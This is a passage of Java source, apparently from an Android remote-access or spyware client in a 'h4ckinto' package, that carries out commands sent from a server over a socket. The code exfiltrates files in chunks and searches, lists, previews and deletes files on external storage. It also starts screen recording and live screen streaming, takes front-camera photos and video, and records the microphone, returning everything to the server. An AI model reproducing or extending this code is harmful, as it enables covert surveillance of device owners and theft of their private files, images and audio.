     * Resume (or start) sending chunks for a ResumableUploadTask.
     * Runs on a new background thread. Sends one chunk at a time, waits for ACK.
     * If disconnected mid-transfer, the task is paused and will be resumed on reconnect.
     */
    private void resumeUploadTask(final ResumableUploadTask task) {
        com.h4ckinto.android.utils.AppExecutors.get().io().execute(() -> {
            java.io.FileInputStream fis = null;
            try {
                java.io.File file = new java.io.File(task.filePath);
                if (!file.exists()) {
                    Log.e(TAG, "File no longer exists: " + task.filePath);
                    activeUploads.remove(task.fileId);
                    sendErrorResponse("file_download", "File not found: " + task.filePath);
                    return;
                }

                fis = new java.io.FileInputStream(file);
                byte[] buffer = new byte[task.chunkSize];
                long startTime = System.currentTimeMillis();

                // Seek to the correct position if resuming
                int startChunk = task.nextChunkToSend;
                if (startChunk > 0) {
                    long skipBytes = (long) startChunk * task.chunkSize;
                    long skipped = fis.skip(skipBytes);
                    Log.d(TAG, "⏩ Skipped to chunk " + startChunk +
                            " (skipped " + formatFileSize(skipped) + ")");
                }

                // ACK timeout: how long to wait for server ACK before considering it lost
                final long ACK_TIMEOUT_MS = 30000; // 30 seconds
                final int MAX_RETRIES = 3;         // Retry a chunk up to 3 times

                for (int chunkIndex = startChunk; chunkIndex < task.totalChunks; chunkIndex++) {
                    // Check if paused (disconnect) or cancelled
                    if (task.paused) {
                        Log.d(TAG, "⏸️ Upload paused at chunk " + chunkIndex + " (will resume on reconnect)");
                        task.nextChunkToSend = chunkIndex;
                        break;
                    }
                    if (task.cancelled) {
                        Log.d(TAG, "❌ Upload cancelled at chunk " + chunkIndex);
                        activeUploads.remove(task.fileId);
                        // Notify server
                        try {
                            JSONObject cancelData = new JSONObject();
                            cancelData.put("fileId", task.fileId);
                            socket.emit("upload_cancel", cancelData);
                        } catch (Exception ignored) {}
                        break;
                    }

                    // Read the chunk from file
                    int bytesToRead = (int) Math.min(task.chunkSize, task.fileSize - ((long) chunkIndex * task.chunkSize));
                    int bytesRead = fis.read(buffer, 0, bytesToRead);
                    if (bytesRead == -1) {
                        Log.w(TAG, "Unexpected end of file at chunk " + chunkIndex);
                        break;
                    }

                    // Encode chunk to Base64
                    byte[] chunkBytes = new byte[bytesRead];
                    System.arraycopy(buffer, 0, chunkBytes, 0, bytesRead);
                    String base64Chunk = android.util.Base64.encodeToString(chunkBytes, android.util.Base64.NO_WRAP);
                    chunkBytes = null; // Release memory

                    // Build chunk payload
                    JSONObject chunkData = new JSONObject();
                    chunkData.put("fileId", task.fileId);
                    chunkData.put("chunkIndex", chunkIndex);
                    chunkData.put("totalChunks", task.totalChunks);
                    chunkData.put("chunkSize", bytesRead);
                    chunkData.put("buffer", base64Chunk);

                    // Send chunk and wait for ACK (with retry logic)
                    boolean ackReceived = false;
                    for (int retry = 0; retry < MAX_RETRIES && !ackReceived; retry++) {
                        if (task.paused || task.cancelled) break;

                        // Create a latch to wait for the ACK
                        java.util.concurrent.CountDownLatch latch =
                                new java.util.concurrent.CountDownLatch(1);
                        chunkAckLatches.put(task.fileId, latch);
                        lastAckStatus.remove(task.fileId);

                        // Send the chunk
                        socket.emit("upload_chunk", chunkData);

                        // Wait for ACK with timeout
                        boolean gotAck = latch.await(ACK_TIMEOUT_MS, java.util.concurrent.TimeUnit.MILLISECONDS);

                        if (task.paused) {
                            // Disconnected while waiting — exit cleanly, will resume later
                            Log.d(TAG, "⏸️ Disconnected while waiting for ACK on chunk " + chunkIndex);
                            task.nextChunkToSend = chunkIndex; // Re-send this chunk on resume
                            break;
                        }

                        if (gotAck) {
                            String status = lastAckStatus.getOrDefault(task.fileId, "ok");
                            if ("ok".equals(status) || "duplicate".equals(status)) {
                                ackReceived = true;
                            } else if ("error".equals(status)) {
                                Log.w(TAG, "⚠️ Server returned error for chunk " + chunkIndex +
                                        ", retry " + (retry + 1) + "/" + MAX_RETRIES);
                            }
                        } else {
                            Log.w(TAG, "⏱️ ACK timeout for chunk " + chunkIndex +
                                    ", retry " + (retry + 1) + "/" + MAX_RETRIES);
                        }
                    }

                    if (!ackReceived && !task.paused && !task.cancelled) {
                        Log.e(TAG, "❌ Failed to send chunk " + chunkIndex +
                                " after " + MAX_RETRIES + " retries");
                        sendErrorResponse("file_download",
                                "Upload failed at chunk " + chunkIndex + " after " + MAX_RETRIES + " retries");
                        activeUploads.remove(task.fileId);
                        break;
                    }

                    // Update task state
                    task.nextChunkToSend = chunkIndex + 1;

                    // Log progress periodically
                    if (chunkIndex % 5 == 0 || chunkIndex == task.totalChunks - 1) {
                        long elapsed = System.currentTimeMillis() - startTime;
                        long bytesSent = (long)(chunkIndex + 1) * task.chunkSize;
                        if (bytesSent > task.fileSize) bytesSent = task.fileSize;
                        double progress = (bytesSent * 100.0) / task.fileSize;
                        double speed = elapsed > 0 ? (bytesSent / 1024.0 / 1024.0) / (elapsed / 1000.0) : 0;
                        Log.d(TAG, "   📦 Chunk " + (chunkIndex + 1) + "/" + task.totalChunks +
                                " (" + String.format("%.1f%%", progress) +
                                ") - " + String.format("%.2f MB/s", speed));
                    }
                }

                // Close the file stream
                fis.close();
                fis = null;

                if (!task.paused && !task.cancelled && task.nextChunkToSend >= task.totalChunks) {
                    long totalTime = System.currentTimeMillis() - startTime;
                    double avgSpeed = (task.fileSize / 1024.0 / 1024.0) / (totalTime / 1000.0);
                    Log.d(TAG, "✅ Resumable upload complete (all chunks sent)!");
                    Log.d(TAG, "   File  : " + task.fileName);
                    Log.d(TAG, "   Size  : " + formatFileSize(task.fileSize));
                    Log.d(TAG, "   Chunks: " + task.totalChunks);
                    Log.d(TAG, "   Time  : " + (totalTime / 1000.0) + "s");
                    Log.d(TAG, "   Speed : " + String.format("%.2f MB/s", avgSpeed));
                    // Note: activeUploads entry is cleaned up when we receive upload_complete from server
                }

            } catch (java.io.FileNotFoundException e) {
                Log.e(TAG, "File not found during resumable upload: " + task.filePath);
                activeUploads.remove(task.fileId);
                sendErrorResponse("file_download", "File not found: " + e.getMessage());
            } catch (java.io.IOException e) {
                Log.e(TAG, "IO error during resumable upload: " + e.getMessage());
                // Don't remove from activeUploads — this might be a transient error; allow resume
                task.paused = true;
                task.nextChunkToSend = Math.max(0, task.nextChunkToSend);
            } catch (InterruptedException e) {
                Log.w(TAG, "Upload thread interrupted: " + task.fileId);
                task.paused = true;
                Thread.currentThread().interrupt();
            } catch (OutOfMemoryError e) {
                Log.e(TAG, "Out of memory during resumable upload");
                activeUploads.remove(task.fileId);
                sendErrorResponse("file_download", "Out of memory error");
            } catch (Exception e) {
                Log.e(TAG, "Error during resumable upload: " + e.getMessage());
                e.printStackTrace();
                activeUploads.remove(task.fileId);
                sendErrorResponse("file_download", "Resumable upload failed: " + e.getMessage());
            } finally {
                if (fis != null) {
                    try { fis.close(); } catch (Exception ignored) {}
                }
            }
        });
    }
    
    private void searchFiles(String query) {
        try {
            Log.d(TAG, "Searching files for: " + query);
            
            JSONObject searchData = new JSONObject();
            JSONArray results = new JSONArray();
            
            // Search in common directories
            String[] searchPaths = {
                android.os.Environment.getExternalStorageDirectory().getAbsolutePath(),
                context.getFilesDir().getAbsolutePath()
            };
            
            for (String searchPath : searchPaths) {
                java.io.File searchDir = new java.io.File(searchPath);
                if (searchDir.exists() && searchDir.canRead()) {
                    searchInDirectory(searchDir, query.toLowerCase(), results, 0, 50);
                }
            }
            
            searchData.put("type", "search");
            searchData.put("query", query);
            searchData.put("results", results);
            searchData.put("count", results.length());
            searchData.put("status", "Search completed");
            
            socket.emit(Constants.MESSAGE_FILES, searchData);
            Log.d(TAG, "Search completed: " + results.length() + " results");
            
        } catch (Exception e) {
            Log.e(TAG, "Error searching files: " + e.getMessage());
            sendErrorResponse("file_search", "Search failed: " + e.getMessage());
        }
    }
    
    private void searchInDirectory(java.io.File directory, String query, JSONArray results, int depth, int maxResults) {
        if (depth > 3 || results.length() >= maxResults) return;
        
        try {
            java.io.File[] files = directory.listFiles();
            if (files != null) {
                for (java.io.File file : files) {
                    if (results.length() >= maxResults) break;
                    
                    if (file.getName().toLowerCase().contains(query)) {
                        try {
                            JSONObject fileObj = new JSONObject();
                            fileObj.put("name", file.getName());
                            fileObj.put("path", file.getAbsolutePath());
                            fileObj.put("isDir", file.isDirectory());
                            fileObj.put("isDirectory", file.isDirectory());
                            fileObj.put("size", file.length());
                            fileObj.put("sizeFormatted", formatFileSize(file.length()));
                            fileObj.put("extension", getFileExtension(file.getName()));
                            fileObj.put("type", getFileType(getFileExtension(file.getName())));
                            
                            // Format last modified date
                            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US);
                            fileObj.put("lastModified", sdf.format(new java.util.Date(file.lastModified())));
                            
                            results.put(fileObj);
                        } catch (Exception e) {
                            Log.w(TAG, "Error processing search result: " + file.getName());
                        }
                    }
                    
                    if (file.isDirectory() && !file.getName().startsWith(".")) {
                        searchInDirectory(file, query, results, depth + 1, maxResults);
                    }
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Error searching in directory: " + directory.getAbsolutePath());
        }
    }
    
    private void deleteFile(String filePath) {
        try {
            Log.d(TAG, "Deleting file: " + filePath);
            
            java.io.File file = new java.io.File(filePath);
            if (!file.exists()) {
                sendErrorResponse("file_delete", "File not found: " + filePath);
                return;
            }
            
            boolean deleted = file.delete();
            if (deleted) {
                JSONObject result = new JSONObject();
                result.put("type", "delete");
                result.put("path", filePath);
                result.put("status", "File deleted successfully");
                socket.emit(Constants.MESSAGE_FILES, result);
                Log.d(TAG, "File deleted: " + filePath);
            } else {
                sendErrorResponse("file_delete", "Failed to delete file: " + filePath);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error deleting file: " + e.getMessage());
            sendErrorResponse("file_delete", "Delete failed: " + e.getMessage());
        }
    }
    
    private void createFolder(String parentPath, String folderName) {
        try {
            Log.d(TAG, "Creating folder: " + folderName + " in " + parentPath);
            
            java.io.File parentDir = new java.io.File(parentPath);
            if (!parentDir.exists() || !parentDir.isDirectory()) {
                sendErrorResponse("file_create", "Parent directory not found: " + parentPath);
                return;
            }
            
            java.io.File newFolder = new java.io.File(parentDir, folderName);
            boolean created = newFolder.mkdir();
            
            if (created) {
                JSONObject result = new JSONObject();
                result.put("type", "create_folder");
                result.put("path", newFolder.getAbsolutePath());
                result.put("name", folderName);
                result.put("status", "Folder created successfully");
                socket.emit(Constants.MESSAGE_FILES, result);
                Log.d(TAG, "Folder created: " + newFolder.getAbsolutePath());
            } else {
                sendErrorResponse("file_create", "Failed to create folder: " + folderName);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error creating folder: " + e.getMessage());
            sendErrorResponse("file_create", "Create folder failed: " + e.getMessage());
        }
    }
    
    private void previewFile(String filePath) {
        try {
            Log.d(TAG, "Previewing file: " + filePath);
            
            java.io.File file = new java.io.File(filePath);
            if (!file.exists()) {
                sendErrorResponse("file_preview", "File not found: " + filePath);
                return;
            }
            
            if (file.isDirectory()) {
                sendErrorResponse("file_preview", "Cannot preview directory: " + filePath);
                return;
            }
            
            String extension = getFileExtension(file.getName()).toLowerCase();
            JSONObject previewData = new JSONObject();
            previewData.put("type", "preview");
            previewData.put("fileName", file.getName());
            previewData.put("filePath", filePath);
            previewData.put("fileSize", file.length());
            previewData.put("fileSizeFormatted", formatFileSize(file.length()));
            previewData.put("extension", extension);
            previewData.put("fileType", getFileType(extension));
            
            // Preview text files
            if (isTextFile(extension)) {
                String content = readTextFile(file, 1000); // Read first 1000 characters
                previewData.put("content", content);
                previewData.put("isText", true);
            } else {
                previewData.put("content", "Binary file - cannot preview");
                previewData.put("isText", false);
            }
            
            previewData.put("status", "Preview generated");
            socket.emit(Constants.MESSAGE_FILES, previewData);
            Log.d(TAG, "File preview sent: " + file.getName());
            
        } catch (Exception e) {
            Log.e(TAG, "Error previewing file: " + e.getMessage());
            sendErrorResponse("file_preview", "Preview failed: " + e.getMessage());
        }
    }
    
    private boolean isTextFile(String extension) {
        String[] textExtensions = {"txt", "log", "json", "xml", "html", "css", "js", "java", "py", "cpp", "c", "h", "md", "csv", "ini", "cfg", "conf"};
        for (String ext : textExtensions) {
            if (ext.equals(extension)) {
                return true;
            }
        }
        return false;
    }
    
    private String readTextFile(java.io.File file, int maxLength) {
        try {
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            byte[] buffer = new byte[Math.min((int) file.length(), maxLength)];
            fis.read(buffer);
            fis.close();
            return new String(buffer, "UTF-8");
        } catch (Exception e) {
            return "Error reading file: " + e.getMessage();
        }
    }
    
    private String getFileEmoji(String fileName, boolean isDirectory, String extension) {
        if (isDirectory) {
            return "📁";
        }
        
        switch (extension.toLowerCase()) {
            case "jpg":
            case "jpeg":
            case "png":
            case "gif":
            case "bmp":
            case "webp":
                return "🖼️";
            case "mp4":
            case "avi":
            case "mkv":
            case "mov":
            case "wmv":
            case "flv":
                return "🎥";
            case "mp3":
            case "wav":
            case "aac":
            case "flac":
            case "ogg":
            case "3gp":
                return "🎵";
            case "pdf":
                return "📄";
            case "doc":
            case "docx":
                return "📝";
            case "txt":
            case "log":
                return "📄";
            case "zip":
            case "rar":
            case "7z":
                return "📦";
            case "apk":
                return "📱";
            case "exe":
                return "⚙️";
            default:
                return "📄";
        }
    }
    
    private String getFileExtension(String fileName) {
        if (fileName == null || !fileName.contains(".")) {
            return "";
        }
        return fileName.substring(fileName.lastIndexOf(".") + 1).toLowerCase();
    }
    
    /**
     * List files using MediaStore API (Android 10+)
     * This method queries MediaStore.Files to get ALL file types, not just images
     * 
     * @param directory The directory to list files from
     * @return JSONArray containing file information, or null if MediaStore query fails
     */
    private JSONArray listFilesUsingMediaStore(java.io.File directory) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            return null; // MediaStore.Files requires Android 10+
        }
        
        JSONArray filesList = new JSONArray();
        ContentResolver resolver = context.getContentResolver();
        
        try {
            String directoryPath = directory.getAbsolutePath();
            Log.d(TAG, "Querying MediaStore for directory: " + directoryPath);
            
            // Query MediaStore.Files - this gets ALL file types, not just images
            Uri contentUri = MediaStore.Files.getContentUri("external");
            
            // Projection: columns we want to retrieve
            String[] projection = {
                MediaStore.Files.FileColumns._ID,
                MediaStore.Files.FileColumns.DATA,
                MediaStore.Files.FileColumns.DISPLAY_NAME,
                MediaStore.Files.FileColumns.SIZE,
                MediaStore.Files.FileColumns.DATE_MODIFIED,
                MediaStore.Files.FileColumns.MIME_TYPE,
                MediaStore.Files.FileColumns.MEDIA_TYPE
            };
            
            // Selection: filter by directory path (get direct children only)
            String selection = MediaStore.Files.FileColumns.DATA + " LIKE ? AND " +
                             MediaStore.Files.FileColumns.DATA + " NOT LIKE ?";
            String[] selectionArgs = {
                directoryPath + "/%",
                directoryPath + "/%/%"
            };
            
            String sortOrder = MediaStore.Files.FileColumns.DISPLAY_NAME + " ASC";
            
            Cursor cursor = null;
            try {
                cursor = resolver.query(contentUri, projection, selection, selectionArgs, sortOrder);
                
                if (cursor == null) {
                    Log.w(TAG, "MediaStore query returned null cursor");
                    return null;
                }
                
                Log.d(TAG, "MediaStore query returned " + cursor.getCount() + " files");
                
                int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA);
                int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DISPLAY_NAME);
                int sizeColumn = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.SIZE);
                int dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATE_MODIFIED);
                int mimeTypeColumn = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.MIME_TYPE);
                int mediaTypeColumn = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.MEDIA_TYPE);
                
                while (cursor.moveToNext()) {
                    try {
                        String filePath = cursor.getString(dataColumn);
                        String fileName = cursor.getString(nameColumn);
                        long fileSize = cursor.getLong(sizeColumn);
                        long dateModified = cursor.getLong(dateColumn) * 1000;
                        String mimeType = cursor.getString(mimeTypeColumn);
                        int mediaType = cursor.getInt(mediaTypeColumn);
                        
                        if (filePath == null || !filePath.startsWith(directoryPath)) continue;
                        
                        String relativePath = filePath.substring(directoryPath.length());
                        if (relativePath.startsWith("/")) relativePath = relativePath.substring(1);
                        if (relativePath.contains("/")) continue; // Skip subdirectories
                        
                        java.io.File file = new java.io.File(filePath);
                        boolean isDirectory = file.isDirectory();
                        String extension = getFileExtension(fileName);
                        String fileType = determineFileTypeFromMime(mimeType, extension, mediaType);
                        
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", fileName != null ? fileName : "Unknown");
                        fileObj.put("path", filePath);
                        fileObj.put("isDir", isDirectory);
                        fileObj.put("isDirectory", isDirectory);
                        fileObj.put("size", isDirectory ? 0 : fileSize);
                        fileObj.put("sizeFormatted", formatFileSize(isDirectory ? 0 : fileSize));
                        fileObj.put("extension", extension);
                        fileObj.put("type", fileType);
                        fileObj.put("mimeType", mimeType != null ? mimeType : "");
                        
                        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US);
                        if (dateModified > 0) {
                            fileObj.put("lastModified", sdf.format(new java.util.Date(dateModified)));
                            fileObj.put("timestamp", dateModified);
                        } else {
                            fileObj.put("lastModified", "");
                            fileObj.put("timestamp", 0);
                        }
                        
                        String emoji = getFileEmoji(fileName, isDirectory, extension);
                        fileObj.put("displayName", emoji + " " + (fileName != null ? fileName : "Unknown"));
                        if (fileName != null && fileName.startsWith(".")) {
                            fileObj.put("isHidden", true);
                        }
                        fileObj.put("readable", true);
                        fileObj.put("source", "MediaStore");
                        
                        filesList.put(fileObj);
                        Log.d(TAG, "MediaStore: Added " + fileName + " (type: " + fileType + ", mime: " + mimeType + ")");
                    } catch (Exception e) {
                        Log.w(TAG, "Error processing MediaStore file: " + e.getMessage());
                    }
                }
            } finally {
                if (cursor != null) cursor.close();
            }
            
            // Add directories from File API (MediaStore doesn't list directories well)
            try {
                java.io.File[] dirFiles = directory.listFiles();
                if (dirFiles != null) {
                    for (java.io.File file : dirFiles) {
                        if (file.isDirectory()) {
                            boolean found = false;
                            for (int i = 0; i < filesList.length(); i++) {
                                JSONObject existing = filesList.getJSONObject(i);
                                if (file.getAbsolutePath().equals(existing.getString("path"))) {
                                    found = true;
                                    break;
                                }
                            }
                            if (!found) {
                                JSONObject dirObj = new JSONObject();
                                dirObj.put("name", file.getName());
                                dirObj.put("path", file.getAbsolutePath());
                                dirObj.put("isDir", true);
                                dirObj.put("isDirectory", true);
                                dirObj.put("size", 0);
                                dirObj.put("sizeFormatted", "0 B");
                                dirObj.put("extension", "");
                                dirObj.put("type", "Folder");
                                dirObj.put("mimeType", "");
                                java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US);
                                long lastModified = file.lastModified();
                                if (lastModified > 0) {
                                    dirObj.put("lastModified", sdf.format(new java.util.Date(lastModified)));
                                    dirObj.put("timestamp", lastModified);
                                } else {
                                    dirObj.put("lastModified", "");
                                    dirObj.put("timestamp", 0);
                                }
                                dirObj.put("displayName", "📁 " + file.getName());
                                dirObj.put("readable", true);
                                dirObj.put("source", "FileAPI");
                                filesList.put(dirObj);
                            }
                        }
                    }
                }
            } catch (Exception e) {
                Log.w(TAG, "Error adding directories from File API: " + e.getMessage());
            }
            
            Log.d(TAG, "MediaStore query completed: " + filesList.length() + " total items");
            return filesList.length() > 0 ? filesList : null;
            
        } catch (Exception e) {
            Log.e(TAG, "Error querying MediaStore: " + e.getMessage());
            return null;
        }
    }
    
    /**
     * Determine file type from MIME type, extension, and media type
     */
    private String determineFileTypeFromMime(String mimeType, String extension, int mediaType) {
        if (mimeType != null && !mimeType.isEmpty()) {
            if (mimeType.startsWith("image/")) return "Image";
            else if (mimeType.startsWith("video/")) return "Video";
            else if (mimeType.startsWith("audio/")) return "Audio";
            else if (mimeType.equals("application/pdf")) return "PDF";
            else if (mimeType.equals("application/zip") || 
                    mimeType.equals("application/x-rar-compressed") ||
                    mimeType.equals("application/x-7z-compressed")) return "Archive";
            else if (mimeType.equals("application/vnd.android.package-archive")) return "Application";
            else if (mimeType.startsWith("text/")) return "Text";
            else if (mimeType.startsWith("application/msword") ||
                    mimeType.startsWith("application/vnd.openxmlformats-officedocument")) return "Document";
        }
        
        if (mediaType == MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE) return "Image";
        else if (mediaType == MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO) return "Video";
        else if (mediaType == MediaStore.Files.FileColumns.MEDIA_TYPE_AUDIO) return "Audio";
        
        return getFileType(extension);
    }
    
    private void sendErrorResponse(String commandType, String errorMessage) {
        try {
            JSONObject errorData = new JSONObject();
            errorData.put("type", "error");
            errorData.put("command", commandType);
            errorData.put("error", errorMessage);
            errorData.put("status", "Error: " + errorMessage);
            
            socket.emit(Constants.MESSAGE_FILES, errorData);
            Log.d(TAG, "Sent error response: " + errorMessage);
        } catch (Exception e) {
            Log.e(TAG, "Error sending error response: " + e.getMessage());
        }
    }
    
    /**
     * Handle screen recording command
     * Command format: JSONObject with "type": "0xSC" or "0xSC:duration" where duration is in seconds
     */
    private void handleScreenRecordingCommand(JSONObject command) {
        try {
            // Parse duration from command (default: 30 seconds)
            int duration = 30;
            
            // First, try to get duration from command type string (e.g., "0xSC:30")
            String commandType = command.getString("type");
            if (commandType != null && commandType.contains(":")) {
                try {
                    String[] parts = commandType.split(":");
                    if (parts.length > 1) {
                        duration = Integer.parseInt(parts[1].trim());
                        Log.d(TAG, "Parsed duration from command type: " + duration);
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Could not parse duration from command type: " + commandType);
                }
            }
            
            // Also try to get duration from JSON object fields
            if (command.has("duration")) {
                try {
                    duration = command.getInt("duration");
                    Log.d(TAG, "Got duration from command field: " + duration);
                } catch (Exception e) {
                    Log.w(TAG, "Invalid duration in command, using parsed value");
                }
            }
            
            // Validate duration
            if (duration < 1) duration = 1;
            if (duration > 300) duration = 300; // Max 5 minutes
            
            Log.d(TAG, "Requesting screen recording for " + duration + " seconds");
            
            // Request MediaProjection permission via Activity
            // We need to send an intent to SimpleMainActivity to request screen capture
            Intent intent = new Intent("com.h4ckinto.android.REQUEST_SCREEN_RECORDING");
            intent.setPackage(context.getPackageName());
            intent.putExtra("duration", duration);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            context.startActivity(intent);
            
            // Send acknowledgment
            JSONObject ackData = new JSONObject();
            ackData.put("type", "screen_recording_requested");
            ackData.put("duration", duration);
            ackData.put("status", "Requesting screen capture permission...");
            sendFileData(ackData);
            
            Log.d(TAG, "Screen recording request sent to Activity");
            
        } catch (Exception e) {
            Log.e(TAG, "Error handling screen recording command", e);
            sendErrorResponse("screen_recording", "Failed to start screen recording: " + e.getMessage());
        }
    }

    /**
     * Handle live screen streaming command.
     * 
     * This starts the ScreenStreamService which captures the screen in real-time
     * and streams frames to the server as JPEG images.
     * 
     * Command parameters (optional, from JSON):
     *   - action: "start" or "stop" (default: "start")
     *   - quality: 1-100 JPEG quality (default: 50)
     *   - fps: 1-30 frames per second (default: 5)
     *   - scale: 0.1-1.0 scale factor (default: 0.5)
     */
    private void handleScreenStreamCommand(JSONObject command) {
        try {
            String action = command.optString("action", "start");
            
            if ("stop".equalsIgnoreCase(action)) {
                // Stop the streaming service
                Log.d(TAG, "Stopping screen stream service");
                Intent stopIntent = new Intent(context, com.h4ckinto.android.service.ScreenStreamService.class);
                context.stopService(stopIntent);
                
                JSONObject ackData = new JSONObject();
                ackData.put("type", "screen_stream_stop_requested");
                ackData.put("status", "Stopping screen stream...");
                sendFileData(ackData);
                return;
            }
            
            // Parse stream settings
            int quality = command.optInt("quality", 50);
            int fps = command.optInt("fps", 5);
            double scale = command.optDouble("scale", 0.5);
            
            Log.d(TAG, "Requesting screen stream - Quality: " + quality + ", FPS: " + fps + ", Scale: " + scale);
            
            // Request MediaProjection permission via Activity
            // Similar to screen recording, we need user permission first
            Intent intent = new Intent("com.h4ckinto.android.REQUEST_SCREEN_STREAM");
            intent.setPackage(context.getPackageName());
            intent.putExtra("quality", quality);
            intent.putExtra("fps", fps);
            intent.putExtra("scale", (float) scale);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            context.startActivity(intent);
            
            // Send acknowledgment
            JSONObject ackData = new JSONObject();
            ackData.put("type", "screen_stream_requested");
            ackData.put("quality", quality);
            ackData.put("fps", fps);
            ackData.put("scale", scale);
            ackData.put("status", "Requesting screen capture permission...");
            sendFileData(ackData);
            
            Log.d(TAG, "Screen stream request sent to Activity");
            
        } catch (Exception e) {
            Log.e(TAG, "Error handling screen stream command", e);
            sendErrorResponse("screen_stream", "Failed to start screen stream: " + e.getMessage());
        }
    }
    
    /**
     * Take a photo using the front camera
     */
    private void takeFrontCameraVideo(int durationSeconds) {
        try {
            Intent serviceIntent = new Intent(context, com.h4ckinto.android.service.MainService.class);
            serviceIntent.setAction("com.h4ckinto.android.TAKE_FRONT_VIDEO");
            serviceIntent.putExtra("duration_sec", durationSeconds);
            context.startService(serviceIntent);
            Log.d(TAG, "Front camera video request sent (" + durationSeconds + "s)");
            JSONObject ackData = new JSONObject();
            ackData.put("type", "camera_video_requested");
            ackData.put("status", "Recording front camera video...");
            ackData.put("duration", durationSeconds);
            ackData.put("timestamp", System.currentTimeMillis());
            sendFileData(ackData);
        } catch (Exception e) {
            Log.e(TAG, "Error requesting front camera video", e);
            sendErrorResponse("camera_video", "Failed to start video: " + e.getMessage());
        }
    }

    private void takeFrontCameraPhoto() {
        try {
            // Use Intent to communicate with service
            Intent serviceIntent = new Intent(context, com.h4ckinto.android.service.MainService.class);
            serviceIntent.setAction("com.h4ckinto.android.TAKE_FRONT_PHOTO");
            context.startService(serviceIntent);
            
            Log.d(TAG, "Front camera photo request sent to service");
            
            // Send acknowledgment
            JSONObject ackData = new JSONObject();
            ackData.put("type", "camera_photo_requested");
            ackData.put("status", "Taking front camera photo...");
            ackData.put("timestamp", System.currentTimeMillis());
            sendFileData(ackData);
            
        } catch (Exception e) {
            Log.e(TAG, "Error requesting front camera photo", e);
            sendErrorResponse("camera", "Failed to take photo: " + e.getMessage());
        }
    }
    
    private void sendMicrophoneData() {
        try {
            JSONObject micData = new JSONObject();
            
            // Check if we have audio recording permission
            if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.RECORD_AUDIO) 
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                micData.put("type", "audio");
                micData.put("data", "");
                micData.put("status", "Microphone permission not granted");
                micData.put("error", "RECORD_AUDIO permission required");
                socket.emit(Constants.MESSAGE_MIC, micData);
                return;
            }
            
            // Get recording duration from command (default 10 seconds)
            int recordingDuration = 10; // Default
            try {
                // Duration should be passed in the command payload
                // This will be set by the server command handler
                recordingDuration = Math.max(5, Math.min(300, recordingDuration)); // 5-300 seconds
            } catch (Exception e) {
                Log.w(TAG, "Using default recording duration: 10 seconds");
            }
            final int finalDuration = recordingDuration;
            
            // Try to start audio recording
            try {
                // Create a temporary file for recording
                java.io.File tempFile = new java.io.File(context.getCacheDir(), 
                    "temp_audio_" + System.currentTimeMillis() + ".3gp");
                
                android.media.MediaRecorder mediaRecorder = new android.media.MediaRecorder();
                
                // Use MIC audio source
                mediaRecorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
                mediaRecorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
                mediaRecorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
                mediaRecorder.setAudioSamplingRate(44100);
                mediaRecorder.setAudioEncodingBitRate(128000);
                mediaRecorder.setAudioChannels(1); // Mono
                mediaRecorder.setOutputFile(tempFile.getAbsolutePath());
                
                Log.d(TAG, "Audio recorder configured: AAC, 44.1kHz, 128kbps, mono");
                
                // Prepare and start recording
                try {
                    mediaRecorder.prepare();
                    mediaRecorder.start();
                    Log.d(TAG, "✅ Audio recording started with AAC encoder");
                } catch (Exception prepareError) {
                    // AAC failed, try fallback with AMR_NB
                    Log.w(TAG, "AAC prepare failed: " + prepareError.getMessage() + ", trying AMR_NB fallback");
                    mediaRecorder.release();
                    
                    mediaRecorder = new android.media.MediaRecorder();
                    mediaRecorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
                    mediaRecorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP);
                    mediaRecorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB);
                    mediaRecorder.setOutputFile(tempFile.getAbsolutePath());
                    mediaRecorder.prepare();
                    mediaRecorder.start();
                    Log.d(TAG, "✅ Audio recording started with AMR_NB fallback encoder");
                }
                
                Log.d(TAG, "✅ Audio recording started for " + finalDuration + " seconds...");
                
                // Store MediaRecorder reference for later use
                final android.media.MediaRecorder finalMediaRecorder = mediaRecorder;
                final long recordingStartTime = System.currentTimeMillis();
                
                // Use Handler to stop recording after delay (runs on main thread)
                android.os.Handler mainHandler = new android.os.Handler(android.os.Looper.getMainLooper());
                mainHandler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            if (finalMediaRecorder != null) {
                                long recordingDuration = System.currentTimeMillis() - recordingStartTime;
                                Log.d(TAG, "Stopping audio recording after " + recordingDuration + "ms");
                                
                                finalMediaRecorder.stop();
                                finalMediaRecorder.release();
                                Log.d(TAG, "✅ Audio recording stopped successfully");
                                
                                // Process the recorded file
                                processRecordedAudio(tempFile);
                            } else {
                                Log.w(TAG, "MediaRecorder is null, cannot stop recording");
                            }
                        } catch (Exception e) {
